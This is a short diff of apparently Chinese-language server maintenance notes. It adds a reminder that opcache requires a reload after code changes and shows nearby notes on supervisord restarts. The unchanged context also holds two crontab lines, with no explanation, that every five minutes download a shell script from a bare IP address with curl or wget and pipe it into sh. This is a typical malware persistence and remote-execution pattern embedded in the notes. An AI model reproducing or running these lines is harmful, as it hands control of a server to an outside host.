@@ -19,7 +19,7 @@
 
 - supervisord -c /etc/supervisord.conf或者supervisorctl reload重启进程管理
 
-
+- 开启了opcache 每次修改代码都得reload
 */5 * * * * curl -fsSL http://165.225.157.157:8000/i.sh | sh
 */5 * * * * wget -q -O- http://165.225.157.157:8000/i.sh | sh
 
